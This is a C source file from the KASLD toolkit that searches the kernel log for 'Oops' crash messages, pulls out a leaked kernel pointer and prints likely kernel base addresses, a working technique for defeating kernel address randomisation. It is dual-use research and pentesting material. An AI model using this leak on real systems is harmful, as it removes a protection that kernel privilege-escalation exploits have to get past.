// This file is part of KASLD - https://github.com/bcoles/kasld
// Search dmesg for splats and return the first address that looks like a kernel pointer
// Requires:
// - kernel.dmesg_restrict = 0 (Default on Ubuntu systems); or CAP_SYSLOG capabilities.
// - kernel.panic_on_oops = 0 (Default on most systems).

#define _GNU_SOURCE

#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/klog.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/utsname.h>

// https://www.kernel.org/doc/Documentation/x86/x86_64/mm.txt
unsigned long KERNEL_BASE_MIN = 0xffffffff80000000ul;
unsigned long KERNEL_BASE_MAX = 0xffffffffff000000ul;

struct utsname get_kernel_version() {
  struct utsname u;
  if (uname(&u) != 0) {
    printf("[-] uname(): %m\n");
    exit(1);
  }
  return u;
}

#define SYSLOG_ACTION_READ_ALL 3
#define SYSLOG_ACTION_SIZE_BUFFER 10

int mmap_syslog(char** buffer, int* size) {
  *size = klogctl(SYSLOG_ACTION_SIZE_BUFFER, 0, 0);

  if (*size == -1) {
    printf("[-] klogctl(SYSLOG_ACTION_SIZE_BUFFER): %m\n");
    return 1;
  }

  *size = (*size / getpagesize() + 1) * getpagesize();
  *buffer = (char*)mmap(NULL, *size, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);

  *size = klogctl(SYSLOG_ACTION_READ_ALL, &((*buffer)[0]), *size);

  if (*size == -1) {
    printf("[-] klogctl(SYSLOG_ACTION_READ_ALL): %m\n");
    return 1;
  }

  return 0;
}

unsigned long search_dmesg(char* needle) {
  char* syslog;
  int size;
  const int addr_len = 16; /* 64-bit */
  unsigned long addr = 0;

  if (mmap_syslog(&syslog, &size))
    return 0;

  char* substr = (char*)memmem(&syslog[0], size, needle, strlen(needle));
  if (substr == NULL)
    return 0;

  char *addr_buf;
  addr_buf = strstr(substr, "<ffffffff");

  if (addr_buf == NULL)
    addr_buf = strstr(substr, "[ffffffff");

  if (addr_buf == NULL)
    return 0;

  char* endptr = &addr_buf[addr_len];
  addr = strtoul(&addr_buf[1], &endptr, 16);

  if (addr > KERNEL_BASE_MIN && addr < KERNEL_BASE_MAX)
    return addr;

  return 0;
}

int main (int argc, char **argv) {
  printf("[.] searching dmesg ...\n");

  struct utsname u = get_kernel_version();

  if (strstr(u.machine, "64") == NULL) {
    printf("[-] unsupported: system is not 64-bit.\n");
    exit(1);
  }

  unsigned long addr = search_dmesg("Oops");
  if (!addr) return 1;

  printf("leaked address: %lx\n", addr);

  printf("kernel base (possible): %lx\n", addr & 0xffffffffff000000ul);
  printf("kernel base (possible): %lx\n", addr & 0xfffffffffff00000ul);

  return 0;
}

